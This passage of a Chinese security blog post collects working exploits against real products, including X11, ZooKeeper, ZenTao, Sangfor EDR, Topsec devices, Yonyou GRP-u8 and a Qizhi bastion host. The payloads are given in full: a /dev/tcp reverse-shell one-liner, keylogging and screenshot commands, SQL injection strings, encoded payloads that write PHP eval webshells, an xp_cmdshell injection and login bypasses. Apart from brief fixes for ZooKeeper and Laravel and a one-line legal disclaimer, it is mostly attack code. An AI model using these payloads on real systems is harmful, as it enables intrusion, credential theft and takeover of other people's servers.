                outputFile.writelines(exportCSV(results))
                outputFile.close()
                print(&quot;[+] Results successfully written to &quot; + args.outputFile + &quot; in CSV form.&quot;)
            else:
                print(exportCSV(results))
        else:
            if args.outputFile:
                outputFile.writelines(exportList(results))
                outputFile.close()
                print(&quot;[+] Results successfully written to &quot; + args.outputFile + &quot; in List form.&quot;)
            else:
                print(exportList(results))
    else: # no usernames passed in
        print(&quot;[-] No usernames provided to check&quot;)
        sys.exit(4)

if __name__ == &#39;__main__&#39;:
    main()</code></pre><hr>
<h2 id="X11-server-未授权访问（默认6000端口）"><a href="#X11-server-未授权访问（默认6000端口）" class="headerlink" title="X11 server 未授权访问（默认6000端口）"></a><span id="X11">X11 server 未授权访问（默认6000端口）</span></h2><ol>
<li><code>xhost +</code></li>
<li><strong>nmap扫描：</strong></li>
<li><code>nmap -p6000 IP --script=x11-access</code></li>
<li><strong>MSF验证：</strong></li>
<li><code>use auxiliary/scanner/x11/open_x11</code></li>
<li><strong>MSF利用：</strong></li>
<li><code>use exploit/unix/x11/x11_keyboard_exec</code></li>
<li><code>set rhosts IP/24</code></li>
<li><code>use payload/cmd/unix/reverse_bash</code></li>
<li><code>set time_wait 15</code></li>
<li><strong>搜索xterm，执行命令：</strong></li>
<li><code>nohup 0&lt;&amp;123-; exec 123&lt;&gt;/dev/tcp/localip/4444; sh &lt;&amp;123 &gt;&amp;123 2&gt;&amp;123 &amp;2&gt;/dev/null; sleep 1; exit</code></li>
<li><strong>查看目标信息：</strong></li>
<li><code>xdpyinfo -display &lt;ip&gt;:&lt;display&gt;</code></li>
<li><code>xwininfo –root –tree –display IP:0</code></li>
<li><code>./xwatchwin IP:0 -w 0x45</code></li>
<li><strong>X11截屏：kali执行命令</strong></li>
<li><code>xwd -screen -root -silent -display IP:0 &gt; screenshot.xwd</code></li>
<li><code>convert screenshot.xwd screenshot.png</code></li>
<li><strong>键盘记录：</strong></li>
<li><code>xspy IP</code> #等IP目标的键盘输入</li>
<li><strong>RDP：<a href="https://github.com/sensepost/xrdp" target="_blank" rel="noopener">xrdp.py</a></strong></li>
<li><code>python xrdp.py IP:0</code></li>
<li><code>python xrdp.py IP:0 --no-disp #no-disp：仅加载键盘输入，不显示渲染</code></li>
</ol>
<p><a href="https://www.hackingarticles.in/penetration-testing-on-x11-server/" target="_blank" rel="noopener">https://www.hackingarticles.in/penetration-testing-on-x11-server/</a><br><a href="https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref" target="_blank" rel="noopener">https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref</a></p>
<hr>
<h2 id="ZooKeeper-未授权访问"><a href="#ZooKeeper-未授权访问" class="headerlink" title="ZooKeeper 未授权访问"></a><span id="ZooKeeper">ZooKeeper 未授权访问</span></h2><h3 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><ol>
<li>ZooKeeper是一个分布式的，开放源码的分布式应用程序协调服务，是Google的Chubby一个开源的实现，是Hadoop和Hbase的重要组件。它是一个为分布式应用提供一致性服务的软件，提供的功能包括：配置维护、域名服务、分布式同步、组服务等。ZooKeeper的目标就是封装好复杂易出错的关键服务，将简单易用的接口和性能高效、功能稳定的系统提供给用户。<br>在通常情况下，zookeeper允许未经授权的访问。</li>
</ol>
<h3 id="漏洞危害-2"><a href="#漏洞危害-2" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><ol>
<li>ZooKeeper默认开启在2181端口，在未进行任何访问控制情况下，攻击者可通过未授权漏洞访问zookeeper数据库，可以执行数据库增删改查等危险操作，执行envi命令可获得系统大量的敏感信息，包括系统名称、Java环境。</li>
</ol>
<h3 id="漏洞验证-1"><a href="#漏洞验证-1" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><ol>
<li>zkcli.sh -server [IP]:[port] #连接数据库</li>
<li>getacl / #查看当前权限</li>
<li>echo stat | nc IP 2181</li>
<li>echo envi | nc IP 2181</li>
</ol>
<h3 id="漏洞修复或加固-2"><a href="#漏洞修复或加固-2" class="headerlink" title="漏洞修复或加固"></a>漏洞修复或加固</h3><ol>
<li>修改默认端口为其他端口，2181：对cline端提供服务，2888：集群内机器通讯使用（Leader监听此端口），3888：选举leader使用</li>
<li>配置防火墙策略，不对外网开放，指定允许访问zookeeper服务的IP</li>
<li>添加用户认证并设置相应的权限</li>
</ol>
<h2 id="禅道"><a href="#禅道" class="headerlink" title="禅道"></a>禅道</h2><ul>
<li>查看版本号：/zendao/index.php?mode=getconfig</li>
<li>报错获取绝对路径：/zendao/123</li>
<li>注入报错爆路径：/zentao/index.php?m=block&amp;f=main&amp;mode=getblockdata&amp;blockid=case&amp;param=base64加密的EXP<pre><code>base64编码：{&quot;orderBy&quot;:&quot;order limit 1,1 PROCEDURE ANALYSE(polygon(id),1)#&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;}</code></pre></li>
</ul>
<p>7.3<br>前台SQL注入漏洞 <a href="https://bbs.ichunqiu.com/thread-26268-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-26268-1-1.html</a></p>
<pre><code>/block-main.html?mode=getblockdata&amp;blockid=task&amp;param=payload
payload生成：
&lt;?php
$a=new stdclass();
$a-&gt;account=&quot;admin&quot;;
$a-&gt;type=&quot;id=-1 sqlinject#&quot;;
echo base64_encode(json_encode($a));

/block-main.html?mode=getblockdata&amp;blockid=task&amp;param=eyJhY2NvdW50IjoiYWRtaW4iLCJ0eXBlIjoiaWQ9LTEgc3FsaW5qZWN0IyJ9

&lt;?php
$a=new stdclass();
$a-&gt;account=&quot;admin&quot;;
$a-&gt;type=&quot;id=-1 UNION SELECT 1,2,3,4,5,6,account,8,9,password,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8 FROM zt_user#&quot;;
echo base64_encode(json_encode($a));

/block-main.html?mode=getblockdata&amp;blockid=task&amp;param=eyJhY2NvdW50IjoiYWRtaW4iLCJ0eXBlIjoiaWQ9LTEgVU5JT04gU0VMRUNUIDEsMiwzLDQsNSw2LGFjY291bnQsOCw5LHBhc3N3b3JkLDEsMiwzLDQsNSw2LDcsOCw5LDAsMSwyLDMsNCw1LDYsNyw4LDksMCwxLDIsMyw0LDUsNiw3LDggRlJPTSB6dF91c2VyIyJ9</code></pre><p>8.2-9.2.1<br>注入</p>
<pre><code>payload明文：{&quot;orderBy&quot;:&quot;order limit 1;#&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;}
payload base64：eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMTsjIiwibnVtIjoiMSwxIiwidHlwZSI6Im9wZW5lZGJ5bWUifQ==
请求头加上：Referer: http://127.0.0.1:81/zentao

写入一句话
payload明文：{&quot;orderBy&quot;:&quot;order limit 1;SET @SQL=0x73656C65637420273C3F70687020406576616C28245F504F53545B315D293F3E2720696E746F206F757466696C6520433A2F78616D70702F7A656E74616F2F7777772F746573742E70687027;PREPARE pord FROM @SQL;EXECUTE pord;-- -&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;}

payload base64：eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMTtTRVQgQFNRTD0weDczNjU2QzY1NjM3NDIwMjczQzNGNzA2ODcwMjA0MDY1NzY2MTZDMjgyNDVGNTA0RjUzNTQ1QjMxNUQyOTNGM0UyNzIwNjk2RTc0NkYyMDZGNzU3NDY2Njk2QzY1MjA0MzNBMkY3ODYxNkQ3MDcwMkY3QTY1NkU3NDYxNkYyRjc3Nzc3NzJGNzQ2NTczNzQyRTcwNjg3MDI3O1BSRVBBUkUgcG9yZCBGUk9NIEBTUUw7RVhFQ1VURSBwb3JkOy0tIC0iLCJudW0iOiIxLDEiLCJ0eXBlIjoib3BlbmVkYnltZSJ9</code></pre><p>&lt;=9.2<br>注册一个任意用户组的账号并登录<br>使用exp上传shell文件1.php::$DATA</p>
<pre><code>
&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
    &lt;meta charset=&quot;UTF-8&quot;&gt;
    &lt;title&gt;禅道9.2及之前getshell&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;form action=&quot;http://10.70.132.34:81/zentao/file-ajaxUpload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
    &lt;input type=&quot;file&quot; name=&quot;imgFile&quot;&gt;
    &lt;input type=&quot;submit&quot; name=&quot;mufile&quot;&gt;
&lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre><p>11.6<br>SQL注入 <a href="https://www.cnblogs.com/liliyuanshangcao/p/13285111.html" target="_blank" rel="noopener">https://www.cnblogs.com/liliyuanshangcao/p/13285111.html</a></p>
<pre><code>/zentao/api-getModel-api-sql-sql=select+account,password+from+zt_user</code></pre><p>文件读取</p>
<pre><code>/zentao/api-getModel-file-parseCSV-fileName=/etc/passwd</code></pre><p>RCE</p>
<pre><code>利用文件读取来执行命令
POST /zentao/api-getModel-editor-save-filePath=1111 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: lang=zh-cn; device=desktop; theme=default; windowWidth=2426; windowHeight=796; zentaosid=vqruohhgn7qbhveakg04h9e267
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

phpinfo：fileContent=&lt;?php phpinfo()?&gt; 
执行命令：fileContent=&lt;?php system(&#39;whoami&#39;);?&gt;
获取路径：fileContent=&lt;?php getcwd()?&gt;
写入一句话：fileContent=&lt;?php file_put_contents(&#39;C:/zentao/www/xxx.php.aaa&#39;, &#39;&lt;?php @eval($_REQUEST[&quot;x&quot;]);?&gt;&#39;);?&gt;

http://127.0.0.1/zentao/api-getModel-api-getMethod-filePath=1111
http://127.0.0.1/zentao/api-getModel-api-getMethod-filePath=2222
http://127.0.0.1/zentao/api-getModel-api-getMethod-filePath=3333
http://127.0.0.1/zentao/xxx.php.aaa?x=phpinfo();</code></pre><p>12.4.2 后台管理员权限getshell</p>
<pre><code>登录后：
/zentao/www/client-download-1-[base64编码后的SHELL的下载链接]-1.html #shell上传到 zentao\www\data\client\1\
下载链接例子：HTTP://192.168.0.1/1.PHP、ftp://[username]:[password]@ip/filename</code></pre><hr>
<h2 id="深信服EDR漏洞"><a href="#深信服EDR漏洞" class="headerlink" title="深信服EDR漏洞"></a>深信服EDR漏洞</h2><ol>
<li>&lt; 3.2.21</li>
<li><code>https://x.x.x.x/tool/log/c.php?strip_slashes=system&amp;host=whoami</code><br><a href="https://github.com/A2gel/sangfor-edr-exploit" target="_blank" rel="noopener">https://github.com/A2gel/sangfor-edr-exploit</a></li>
</ol>
<h2 id="深信服-SANGFOR-EDR（终端检测响应平台）-任意用户登录"><a href="#深信服-SANGFOR-EDR（终端检测响应平台）-任意用户登录" class="headerlink" title="深信服-SANGFOR EDR（终端检测响应平台）-任意用户登录"></a>深信服-SANGFOR EDR（终端检测响应平台）-任意用户登录</h2><ol>
<li>&lt; 3.2.19</li>
<li><code>https://x.x.x.x/ui/login.php?user=admin</code></li>
<li>查询完毕以后即可登录平台</li>
</ol>
<h2 id="天融信TopApp-LB-负载均衡系统sql注入"><a href="#天融信TopApp-LB-负载均衡系统sql注入" class="headerlink" title="天融信TopApp-LB 负载均衡系统sql注入"></a>天融信TopApp-LB 负载均衡系统sql注入</h2><pre><code>POST /acc/clsf/report/datasource.php HTTP/1.1
Host:
Connection: close
Accept: text/javascript, text/html, application/xml, text/xml, */*
X-Prototype-Version: 1.6.0.3
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=ijqtopbcbmu8d70o5t3kmvgt57
Content-Type: application/x-www-form-urlencoded
Content-Length: 201

t=l&amp;e=0&amp;s=t&amp;l=1&amp;vid=1+union select 1,2,3,4,5,6,7,8,9,substr(&#39;a&#39;,1,1),11,12,13,14,15,16,17,18,19,20,21,22--+&amp;gid=0&amp;lmt=10&amp;o=r_Speed&amp;asc=false&amp;p=8&amp;lipf=&amp;lipt=&amp;ripf=&amp;ript=&amp;dscp=&amp;proto=&amp;lpf=&amp;lpt=&amp;rpf=&amp;rpt=@。。 </code></pre><h2 id="天融信数据防泄漏系统越权修改管理员密码"><a href="#天融信数据防泄漏系统越权修改管理员密码" class="headerlink" title="天融信数据防泄漏系统越权修改管理员密码"></a>天融信数据防泄漏系统越权修改管理员密码</h2><ol>
<li>无需登录权限,由于修改密码处未校验原密码,且/?module=auth_user&amp;action=mod_edit_pwd接口未授权访问,造成直接修改任意用户密码。默认superman账户uid为1。</li>
</ol>
<pre><code>POST /?module=auth_user&amp;action=mod_edit_pwd
Cookie: username=superman;

uid=1&amp;pd=Newpasswd&amp;mod_pwd=1&amp;dlp_perm=1</code></pre><h2 id="天融信负载均衡TopApp-LB系统无需密码直接登陆"><a href="#天融信负载均衡TopApp-LB系统无需密码直接登陆" class="headerlink" title="天融信负载均衡TopApp-LB系统无需密码直接登陆"></a>天融信负载均衡TopApp-LB系统无需密码直接登陆</h2><ol>
<li>用户名任意</li>
<li>密码：;id</li>
</ol>
<h2 id="天融信TopApp-LB负载均衡命令执行漏洞大量设备可被通杀"><a href="#天融信TopApp-LB负载均衡命令执行漏洞大量设备可被通杀" class="headerlink" title="天融信TopApp-LB负载均衡命令执行漏洞大量设备可被通杀"></a>天融信TopApp-LB负载均衡命令执行漏洞大量设备可被通杀</h2><ol>
<li>用户名：; ping xxx.dnslog.info; echo</li>
<li>密码：随意</li>
</ol>
<h2 id="用友GRP-u8-注入"><a href="#用友GRP-u8-注入" class="headerlink" title="用友GRP-u8 注入"></a>用友GRP-u8 注入</h2><pre><code>POST /Proxy HTTP/1.1
Accept: Accept: */*
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0;)
Host: host
Content-Length: 357
Connection: Keep-Alive
Cache-Control: no-cache


cVer=9.8.0&amp;dp=&lt;?xml version=&quot;1.0&quot; encoding=&quot;GB2312&quot;?&gt;&lt;R9PACKET version=&quot;1&quot;&gt;&lt;DATAFORMAT&gt;XML&lt;/DATAFORMAT&gt;&lt;R9FUNCTION&gt;&lt;NAME&gt;AS_DataRequest&lt;/NAME&gt;&lt;PARAMS&gt;&lt;PARAM&gt;&lt;NAME&gt;ProviderName&lt;/NAME&gt;&lt;DATA format=&quot;text&quot;&gt;DataSetProviderData&lt;/DATA&gt;&lt;/PARAM&gt;&lt;PARAM&gt;&lt;NAME&gt;Data&lt;/NAME&gt;&lt;DATA format=&quot;text&quot;&gt;exec xp_cmdshell &#39;net user&#39;&lt;/DATA&gt;&lt;/PARAM&gt;&lt;/PARAMS&gt;&lt;/R9FUNCTION&gt;&lt;/R9PACKET&gt;</code></pre><h2 id="绿盟UTS综合威胁探针管理员任意登录"><a href="#绿盟UTS综合威胁探针管理员任意登录" class="headerlink" title="绿盟UTS综合威胁探针管理员任意登录"></a>绿盟UTS综合威胁探针管理员任意登录</h2><ol>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/47.png" alt></li>
<li>burpsuite抓包，任意账号密码登录，repeater发包</li>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/48.png" alt></li>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/49.png" alt></li>
<li>更改响应包中的false改为true</li>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/50.png" alt></li>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/51.png" alt></li>
<li>再发包，响应包中password字段泄露真实密码的md5值，复制替换登陆包中的密码md5</li>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/52.png" alt></li>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/53.png" alt></li>
<li><img src="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/54.png" alt></li>
</ol>
<h2 id="Laravel-5-8-注入漏洞"><a href="#Laravel-5-8-注入漏洞" class="headerlink" title="Laravel 5.8 注入漏洞"></a>Laravel 5.8 注入漏洞</h2><pre><code>/laravel/.env
?id=1&quot;,&quot;qwert&quot;,&quot;</code></pre><p>修复建议：</p>
<ol>
<li>关闭laravel配置文件中的调试功能，在.env文件中找到APP_DEBUG=true，将true改为false。</li>
<li>在根目录下添加.htaccess文件，仅限Apache，可以禁止直接访问127.0.0.1/laravel/.env，内容如下：</li>
<li>RewriteEngine On </li>
<li>RewriteRule ^$ public/ </li>
<li>RewriteRule (.*) public/$1</li>
</ol>
<h2 id="齐治堡垒机前台远程命令执行（CNVD-2019-20835）"><a href="#齐治堡垒机前台远程命令执行（CNVD-2019-20835）" class="headerlink" title="齐治堡垒机前台远程命令执行（CNVD-2019-20835）"></a>齐治堡垒机前台远程命令执行（CNVD-2019-20835）</h2><ol>
<li>访问<a href="http://10.20.10.11/listener/cluster_manage.php，返回：&quot;OK&quot;" target="_blank" rel="noopener">http://10.20.10.11/listener/cluster_manage.php，返回：&quot;OK&quot;</a></li>
<li>访问链接，就会生成一句话木马/var/www/shterm/resources/qrcode/help1.php，密码为666</li>
</ol>
<pre><code>https://ip/ha_request.php?action=install&amp;ipaddr=ip&amp;node_id=1${IFS}|`echo${IFS}&quot;ZWNobyAnPD9waHAgQGV2YWwoJF9SRVFVRVNUWzY2Nl0pOz8+Jz4+L3Zhci93d3cvc2h0ZXJtL3Jlc291cmNlcy9xcmNvZGUvaGVscDEucGhwDQo=&quot;|base64${IFS}-d
|bash`|${IFS}|echo${IFS}</code></pre><hr>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://wiki.0-sec.org/#/md" target="_blank" rel="noopener">https://wiki.0-sec.org/#/md</a><br><a href="https://www.baidu.com/" target="_blank" rel="noopener">https://www.baidu.com/</a><br><a href="https://www.google.com/" target="_blank" rel="noopener">https://www.google.com/</a><br><a href="https://github.com/" target="_blank" rel="noopener">https://github.com/</a><br><a href="https://vulhub.org/" target="_blank" rel="noopener">https://vulhub.org/</a></p>

      
       <hr><span style="font-style: italic;color: gray;"> 知识来源于网络，本博客仅供于安全测试学习，禁止非法利用。—— </span>
    </div>
</article>



<div class="article_copyright">
    <p><span class="copy-title">文章标题:</span>漏洞记录</p>
    
    <p><span class="copy-title">本文作者:</span><a  title="10fteam">10fteam</a></p>
    <p><span class="copy-title">发布时间:</span>2020-06-06, 21:36:18</p>
    <p><span class="copy-title">最后更新:</span>2020-12-02, 00:19:02</p>
    <span class="copy-title">原始链接:</span><a class="post-url" href="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/" title="漏洞记录">https://10fteam.github.io/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/</a>
    <p>
        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
    </p>
</div>





    




    </div>
    <div class="copyright">
        <p class="footer-entry">©2019-2020 10fteam</p>
<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>

    </div>
    <div class="full-toc">
        <button class="full"><span class="min "></span></button>
<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
<div class="post-toc"><span class="post-toc-title">目录</span>
    <div class="post-toc-content">

    </div>
</div>
<a class="" id="rocket" ></a>

    </div>
</div>
<div class="acParent"></div>

</body>
<script src="/js/jquery.pjax.js?v=1.0.1" ></script>

<script src="/js/script.js?v=1.0.1" ></script>
<script>
    var img_resize = 'default';
    /*作者、标签的自动补全*/
    $(function () {
        $('.search').AutoComplete({
            'data': ['#工具','#知识','#内网渗透','#CS','#C2','#kali','#漏洞','#CTF','#encrypt_decrypt','#HTB','#靶机','#writeup','#Linux','#信息搜集','#安全加固','#入侵检测','#应急响应','#proxy','#linux','#脚本','#MSF','#PHP','#代码审计','#backdoor','#shell','#数据库','#database','#PWN','#python','#注入','#phpmyadmin','#SQL','#中间件','#WAF','#Struts2','#vulhub','#CVE','#mssql','#windows','#mimikatz','#xss','#DOM','#bypass','#cms','#weblogic','#encode_decode','#靶场','#vulnhub','#僵尸网络','#后门','#远控','#免杀','#webshell','#域渗透','#端口','#CDN','#提权','#DLL','#MISC','#逆向','#editor','#log',],
            'itemHeight': 20,
            'width': 418
        }).AutoComplete('show');
    })
    function initArticle() {
        /*渲染对应的表格样式*/
        
            $(".post .pjax table").addClass("green_title");
        

        /*渲染打赏样式*/
        

        /*高亮代码块行号*/
        
        $('pre code').each(function(){
            var lines = $(this).text().split('\n').length - 1, widther='';
            if (lines>99) {
                widther = 'widther'
            }
            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
            $(this).addClass('has-numbering ' + widther)
                    .parent()
                    .append($numbering);
            for(var i=1;i<=lines;i++){
                $numbering.append($('<li/>').text(i));
            }
        });
        

        /*访问数量*/
        
        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
        

        /*代码高亮，行号对齐*/
        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));

        
        
    }

    /*打赏页面隐藏与展示*/
    

</script>

<!--加入行号的高亮代码块样式-->

<style>
    pre{
        position: relative;
        margin-bottom: 24px;
        border-radius: 10px;
        border: 1px solid #e2dede;
        background: #FFF;
        overflow: hidden;
    }
    code.has-numbering{
        margin-left: 30px;
    }
    code.has-numbering.widther{
        margin-left: 35px;
    }
    .pre-numbering{
        margin: 0px;
        position: absolute;
        top: 0;
        left: 0;
        width: 20px;
        padding: 0.5em 3px 0.7em 5px;
        border-right: 1px solid #C3CCD0;
        text-align: right;
        color: #AAA;
        background-color: #fafafa;
    }
    .pre-numbering.widther {
        width: 35px;
    }
</style>

<!--自定义样式设置-->
<style>
    
    
    .nav {
        <!--width: 542px;-->
        width: 270px;
    }
    .nav.fullscreen {
        <!--margin-left: -542px;-->
        margin-left: -270px;
    }
    .nav-left {
        width: 120px;
    }
    
    
    @media screen and (max-width: 1468px) {
        .nav {
            width: 492px;
        }
        .nav.fullscreen {
            margin-left: -492px;
        }
        .nav-left {
            width: 100px;
        }
    }
    
    
    @media screen and (max-width: 1024px) {
        .nav {
            width: 492px;
            margin-left: -492px
        }
        .nav.fullscreen {
            margin-left: 0;
        }
        .nav .hide-list.fullscreen {
            left: 492px
        }
    }
    
    @media screen and (max-width: 426px) {
        .nav {
            width: 100%;
        }
        .nav-left {
            width: 100%;
        }
    }
    
    
    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
        color: #383636;
    }
    
    
    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
        color: #5e5e5f;
    }
    
    
    .nav-right nav a.hover, #local-search-result a.hover{
        background-color: #e2e0e0;
    }
    
    

    /*列表样式*/
    
    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
        border: #e2dede solid 1px;
        border-radius: 10px;
        padding: 10px 32px 10px 56px;
    }
    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
        padding-top: 5px;
        padding-bottom: 5px;
    }
    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
        margin-bottom: auto;
        margin-left: auto;
    }
    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
        margin-bottom: auto;
        margin-left: auto;
    }
    

    /* 背景图样式 */
    
    


    /*引用块样式*/
    

    /*文章列表背景图*/
    
    .nav-right:before {
        content: ' ';
        display: block;
        position: absolute;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        opacity: 0.3;
        background: url("https://uploadbeta.com/api/pictures/random/?key=BingEverydayWallpaperPicture");
        background-repeat: no-repeat;
        background-position: 50% 0;
        -ms-background-size: cover;
        -o-background-size: cover;
        -moz-background-size: cover;
        -webkit-background-size: cover;
        background-size: cover;
    }
    

    
</style>









</html>
